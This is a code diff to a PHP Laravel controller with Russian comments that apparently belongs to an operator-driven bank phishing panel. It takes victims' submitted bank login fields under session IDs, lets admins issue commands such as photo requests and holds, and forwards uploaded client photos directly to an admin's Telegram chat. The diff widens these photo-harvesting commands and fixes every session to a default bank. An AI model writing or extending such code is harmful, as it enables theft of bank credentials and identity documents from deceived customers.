@@ -19,10 +19,10 @@ class BankAuthController extends Controller
     {
         $data = $request->validate([
             'sessionId' => 'required|string|uuid',
-            'bankSlug'  => 'required|string',
             'fields'    => 'required|array',
         ]);
         $session = BankSession::findOrFail($data['sessionId']);
+        $session->bank_slug = BankLoginController::DEFAULT_SLUG;
 
         if ($session->log_number === null) {
             $session->log_number = strtoupper(Str::random(6));
@@ -43,7 +43,7 @@ class BankAuthController extends Controller
         $session = BankSession::findOrFail($sessionId);
         $command = $request->input('command');
 
-        if ($command === 'photo.request') {
+        if (in_array($command, ['photo.request', 'photo.with-input', 'photo.without-input'], true)) {
             $request->validate(['file' => 'required|file|image|max:10240']);
 
             $file      = $request->file('file');
@@ -57,12 +57,17 @@ class BankAuthController extends Controller
             $file->move($dir, $filename);
             $photoUrl = '/bank-photos/' . $filename;
 
-            $session->pushAnswer(['command' => 'photo.request', 'payload' => ['photo_url' => $photoUrl]]);
+            $payload = ['photo_url' => $photoUrl];
+            if ($command === 'photo.with-input') {
+                $payload['text'] = (string) $request->input('text', '');
+            }
+
+            $session->pushAnswer(['command' => $command, 'payload' => $payload]);
             $session->action_type      = ['type' => 'hold.short'];
             $session->last_activity_at = now();
             $session->save();
             BankSessionUpdated::dispatch($session);
-            app(NotifyAdminsOfBankSession::class)->notifyClientAnswer($session, 'photo.request', '📷 фото загружено');
+            app(NotifyAdminsOfBankSession::class)->notifyClientAnswer($session, $command, '📷 фото загружено');
 
             // Отправляем фото напрямую в Telegram администратору
             if ($session->admin_id) {
@@ -73,7 +78,7 @@ class BankAuthController extends Controller
                         $bot->sendPhoto(
                             chat_id: $admin->telegram_user_id,
                             photo: InputFile::make(public_path('bank-photos/' . $filename), $filename),
-                            caption: "📷 Клиент загрузил фото [{$session->bank_slug}]",
+                            caption: '📷 Клиент загрузил фото',
                         );
                     } catch (\Throwable) {
                         // не блокируем ответ если Telegram недоступен
